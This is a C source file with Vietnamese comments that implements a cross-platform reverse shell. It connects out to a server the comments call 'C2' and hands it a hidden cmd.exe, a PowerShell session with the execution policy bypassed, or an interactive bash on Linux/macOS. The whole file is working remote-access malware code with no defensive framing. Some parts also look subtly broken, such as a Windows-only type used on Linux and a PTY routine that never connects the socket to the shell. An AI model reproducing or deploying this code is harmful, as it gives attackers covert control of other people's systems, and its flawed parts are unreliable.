/**
 * remote_shell.c
 * Trien khai reverse shell cho Windows va Linux/MacOS
 * Ho tro: cmd.exe, powershell.exe, /bin/bash, /bin/sh
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

#ifdef _WIN32
    #include <windows.h>
    #include <winsock2.h>
    #include <ws2tcpip.h>
    #define THREAD_HANDLE HANDLE
    #define THREAD_RETURN DWORD WINAPI
    #define THREAD_PARAM LPVOID
    #define SLEEP_MS(x) Sleep(x)
    #define CLOSE_SOCKET closesocket
    #define SOCKET_TYPE SOCKET
    #define INVALID_SOCK INVALID_SOCKET
    #define SOCKET_ERROR_CODE SOCKET_ERROR
    #pragma comment(lib, "ws2_32.lib")
#else
    #include <unistd.h>
    #include <pthread.h>
    #include <sys/socket.h>
    #include <sys/ioctl.h>
    #include <netinet/in.h>
    #include <arpa/inet.h>
    #include <netdb.h>
    #include <signal.h>
    #include <termios.h>
    #include <fcntl.h>
    #define THREAD_HANDLE pthread_t
    #define THREAD_RETURN void*
    #define THREAD_PARAM void*
    #define SLEEP_MS(x) usleep((x) * 1000)
    #define CLOSE_SOCKET close
    #define SOCKET_TYPE int
    #define INVALID_SOCK (-1)
    #define SOCKET_ERROR_CODE (-1)
#endif

#include "remote_shell.h"

/* Cau truc tham so cho thread doc/ghi */
typedef struct {
    SOCKET_TYPE sock;
    HANDLE pipe_read;
    HANDLE pipe_write;
    int dang_chay;
} ShellParams;

#ifdef _WIN32
/* ==================== WINDOWS REVERSE SHELL ==================== */

/**
 * Thread doc du lieu tu socket va ghi vao pipe (stdin cua process)
 */
static THREAD_RETURN thread_doc_socket_ghi_pipe(THREAD_PARAM param) {
    ShellParams* sp = (ShellParams*)param;
    char buffer[4096];
    int bytes_nhan;
    
    while (sp->dang_chay) {
        bytes_nhan = recv(sp->sock, buffer, sizeof(buffer), 0);
        if (bytes_nhan <= 0) {
            sp->dang_chay = 0;
            break;
        }
        
        DWORD bytes_ghi;
        WriteFile(sp->pipe_write, buffer, bytes_nhan, &bytes_ghi, NULL);
    }
    
    THREAD_EXIT;
}

/**
 * Thread doc du lieu tu pipe (stdout cua process) va ghi vao socket
 */
static THREAD_RETURN thread_doc_pipe_ghi_socket(THREAD_PARAM param) {
    ShellParams* sp = (ShellParams*)param;
    char buffer[4096];
    DWORD bytes_doc;
    
    while (sp->dang_chay) {
        if (!ReadFile(sp->pipe_read, buffer, sizeof(buffer), &bytes_doc, NULL)) {
            sp->dang_chay = 0;
            break;
        }
        
        if (bytes_doc > 0) {
            send(sp->sock, buffer, bytes_doc, 0);
        }
    }
    
    THREAD_EXIT;
}

/**
 * Tao reverse shell tren Windows
 */
int reverse_shell_windows(const char* server_ip, int server_port, int dung_powershell) {
    WSADATA wsa_data;
    if (WSAStartup(MAKEWORD(2, 2), &wsa_data) != 0) {
        return -1;
    }
    
    /* Tao socket ket noi den C2 */
    SOCKET_TYPE sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCK) {
        WSACleanup();
        return -1;
    }
    
    /* Dat timeout */
    int timeout = 10000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR_CODE) {
        CLOSE_SOCKET(sock);
        WSACleanup();
        return -1;
    }
    
    /* Tao pipe cho stdin, stdout, stderr */
    HANDLE child_stdin_read = NULL, child_stdin_write = NULL;
    HANDLE child_stdout_read = NULL, child_stdout_write = NULL;
    
    SECURITY_ATTRIBUTES sa;
    sa.nLength = sizeof(sa);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    
    if (!CreatePipe(&child_stdin_read, &child_stdin_write, &sa, 0)) {
        CLOSE_SOCKET(sock);
        WSACleanup();
        return -1;
    }
    
    if (!CreatePipe(&child_stdout_read, &child_stdout_write, &sa, 0)) {
        CloseHandle(child_stdin_read);
        CloseHandle(child_stdin_write);
        CLOSE_SOCKET(sock);
        WSACleanup();
        return -1;
    }
    
    /* Dam bao read handle khong bi ke thua */
    SetHandleInformation(child_stdin_write, HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(child_stdout_read, HANDLE_FLAG_INHERIT, 0);
    
    /* Khoi tao process */
    PROCESS_INFORMATION pi;
    STARTUPINFOA si;
    ZeroMemory(&pi, sizeof(pi));
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdInput = child_stdin_read;
    si.hStdOutput = child_stdout_write;
    si.hStdError = child_stdout_write;
    si.wShowWindow = SW_HIDE;
    
    char cmd_line[256];
    if (dung_powershell) {
        strcpy(cmd_line, "powershell.exe -NoLogo -NoProfile -NonInteractive -ExecutionPolicy Bypass");
    } else {
        strcpy(cmd_line, "cmd.exe /Q");
    }
    
    if (!CreateProcessA(NULL, cmd_line, NULL, NULL, TRUE, 
                        CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        CloseHandle(child_stdin_read);
        CloseHandle(child_stdin_write);
        CloseHandle(child_stdout_read);
        CloseHandle(child_stdout_write);
        CLOSE_SOCKET(sock);
        WSACleanup();
        return -1;
    }
    
    /* Dong cac handle khong can thiet */
    CloseHandle(child_stdin_read);
    CloseHandle(child_stdout_write);
    CloseHandle(pi.hThread);
    
    /* Tao thread doc/ghi */
    ShellParams sp;
    sp.sock = sock;
    sp.pipe_read = child_stdout_read;
    sp.pipe_write = child_stdin_write;
    sp.dang_chay = 1;
    
    HANDLE thread_read = CreateThread(NULL, 0, thread_doc_socket_ghi_pipe, &sp, 0, NULL);
    HANDLE thread_write = CreateThread(NULL, 0, thread_doc_pipe_ghi_socket, &sp, 0, NULL);
    
    /* Cho process ket thuc */
    WaitForSingleObject(pi.hProcess, INFINITE);
    
    sp.dang_chay = 0;
    
    /* Dong tat ca */
    WaitForSingleObject(thread_read, 3000);
    WaitForSingleObject(thread_write, 3000);
    
    CloseHandle(thread_read);
    CloseHandle(thread_write);
    CloseHandle(child_stdin_write);
    CloseHandle(child_stdout_read);
    CloseHandle(pi.hProcess);
    CLOSE_SOCKET(sock);
    WSACleanup();
    
    return 0;
}

/**
 * Reverse shell tong quat
 */
int reverse_shell(const char* server_ip, int server_port, const char* loai_shell) {
    if (strstr(loai_shell, "powershell") != NULL) {
        return reverse_shell_windows(server_ip, server_port, 1);
    } else if (strstr(loai_shell, "cmd") != NULL) {
        return reverse_shell_windows(server_ip, server_port, 0);
    } else {
        return reverse_shell_windows(server_ip, server_port, 0);
    }
}

int reverse_shell_linux(const char* server_ip, int server_port) {
    /* Stub - Linux shell duoc trien khai o duoi */
    (void)server_ip;
    (void)server_port;
    return -1;
}

int reverse_shell_interactive(const char* server_ip, int server_port) {
    (void)server_ip;
    (void)server_port;
    return -1;
}

#else
/* ==================== LINUX/MACOS REVERSE SHELL ==================== */

/**
 * Tao reverse shell tren Linux/MacOS
 */
int reverse_shell_linux(const char* server_ip, int server_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    
    /* Phan giai IP */
    struct hostent* he = gethostbyname(server_ip);
    if (he == NULL) {
        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
    } else {
        memcpy(&server_addr.sin_addr, he->h_addr_list[0], he->h_length);
    }
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        CLOSE_SOCKET(sock);
        return -1;
    }
    
    /* Fork process con */
    pid_t pid = fork();
    if (pid < 0) {
        CLOSE_SOCKET(sock);
        return -1;
    }
    
    if (pid == 0) {
        /* Process con */
        /* Dup stdin, stdout, stderr den socket */
        dup2(sock, 0); /* stdin */
        dup2(sock, 1); /* stdout */
        dup2(sock, 2); /* stderr */
        
        /* Khoi dong shell */
        char* args[] = {"/bin/bash", "-i", NULL};
        execve("/bin/bash", args, NULL);
        
        /* Neu bash khong co, dung sh */
        char* args_sh[] = {"/bin/sh", "-i", NULL};
        execve("/bin/sh", args_sh, NULL);
        
        exit(0);
    } else {
        /* Process cha */
        CLOSE_SOCKET(sock);
    }
    
    return 0;
}

/**
 * Tao reverse shell interactive voi PTY
 */
int reverse_shell_interactive(const char* server_ip, int server_port) {
    int sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) return -1;
    
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(server_port);
    
    struct hostent* he = gethostbyname(server_ip);
    if (he == NULL) {
        inet_pton(AF_INET, server_ip, &server_addr.sin_addr);
    } else {
        memcpy(&server_addr.sin_addr, he->h_addr_list[0], he->h_length);
    }
    
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        CLOSE_SOCKET(sock);
        return -1;
    }
    
    pid_t pid = fork();
    if (pid < 0) {
        CLOSE_SOCKET(sock);
        return -1;
    }
    
    if (pid == 0) {
        /* Process con - tao PTY */
        setsid(); /* Tao session moi */
        
        /* Tao pseudo terminal */
        int pty_master = posix_openpt(O_RDWR | O_NOCTTY);
        if (pty_master < 0) {
            /* Fallback: dung shell don gian */
            dup2(sock, 0);
            dup2(sock, 1);
            dup2(sock, 2);
            execl("/bin/bash", "bash", "-i", NULL);
            exit(0);
        }
        
        grantpt(pty_master);
        unlockpt(pty_master);
        
        char* pty_slave_name = ptsname(pty_master);
        int pty_slave = open(pty_slave_name, O_RDWR);
        
        /* Dup slave den stdin/stdout/stderr */
        dup2(pty_slave, 0);
        dup2(pty_slave, 1);
        dup2(pty_slave, 2);
        close(pty_slave);
        close(pty_master);
        
        /* Dat TERM */
        setenv("TERM", "xterm-256color", 1);
        
        /* Khoi dong shell */
        execl("/bin/bash", "bash", "--login", NULL);
        execl("/bin/sh", "sh", NULL);
        exit(0);
    } else {
        /* Process cha - chuyen tiep du lieu giua socket va PTY */
        /* Doc tu socket, ghi vao stdin cua child */
        /* (Trong truong hop nay, child da dup socket truc tiep) */
        waitpid(pid, NULL, 0);
        CLOSE_SOCKET(sock);
    }
    
    return 0;
}

/**
 * Reverse shell tong quat
 */
int reverse_shell(const char* server_ip, int server_port, const char* loai_shell) {
    if (strstr(loai_shell, "interactive") != NULL) {
        return reverse_shell_interactive(server_ip, server_port);
    } else {
        return reverse_shell_linux(server_ip, server_port);
    }
}

int reverse_shell_windows(const char* server_ip, int server_port, int dung_powershell) {
    (void)server_ip; (void)server_port; (void)dung_powershell;
    return -1;
}

#endif